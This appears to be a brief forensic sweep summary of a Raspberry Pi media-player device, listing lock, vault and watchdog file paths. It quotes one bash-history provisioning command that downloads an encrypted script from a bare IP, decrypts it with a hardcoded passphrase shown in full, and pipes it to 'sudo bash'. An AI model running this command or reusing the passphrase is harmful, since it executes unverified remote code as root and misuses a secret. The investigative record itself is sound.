User-provided forensic sweep output from Telegram attachment 10---a67e5b8a-ee0a-4b24-aa8f-7e53318c90c8.md on 2026-04-14.

Key observations copied from operator output:
- /mnt/nctv-phoenix-secure exists.
- Relevant paths confirmed: /etc/nctv-phoenix/hardware-lock.env, /usr/local/bin/{hardware_lock.py,unlock_vault.py,repairman.sh,nctv-watchdog.sh}, /var/lib/nctv-phoenix/vault.img, /opt/nctv-player.
- /home/pi/.bash_history contains a strong historical provisioning line:
  curl -fsSL http://3.211.184.159:8080/setup.enc | openssl enc -aes-256-cbc -d -salt -pbkdf2 -k "theNTVofthe360isthe360oftheNTV" | sudo bash
- History also confirms multiple later edits to hardware-lock.env and unlock_vault.py.
- Local notes under /home/pi/Documents/*.md preserve prior command output snapshots including service, vault, and journal data.
